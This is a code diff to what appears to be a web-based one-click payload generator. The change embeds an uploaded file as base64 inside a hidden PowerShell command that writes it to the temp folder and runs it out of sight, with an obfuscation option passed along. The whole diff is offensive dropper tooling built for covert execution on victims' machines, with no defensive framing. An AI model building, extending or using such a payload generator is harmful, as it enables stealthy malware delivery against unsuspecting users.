@@ -518,9 +518,21 @@ def generate_one_click():
         if not uploaded_file or not os.path.exists(uploaded_file):
             return jsonify({'error': 'File not found'}), 404
 
-        # Build command to execute the file
+        # Read file and embed content as base64
+        with open(uploaded_file, 'rb') as f:
+            file_content = f.read()
+
+        encoded_file = base64.b64encode(file_content).decode()
         filename = os.path.basename(uploaded_file)
-        cmd = f'"{uploaded_file}"'
+
+        # Generate PowerShell command that decodes and executes the embedded file
+        cmd = (
+            f'powershell -NoProfile -WindowStyle Hidden -Command '
+            f'"$f=\'$env:temp\\\\{filename}\'; '
+            f'[System.IO.File]::WriteAllBytes($f, '
+            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
+            f'Start-Process $f -WindowStyle Hidden"'
+        )
 
         # Generate one-click payload
         result = create_one_click_payload(cmd, obfuscation_style)
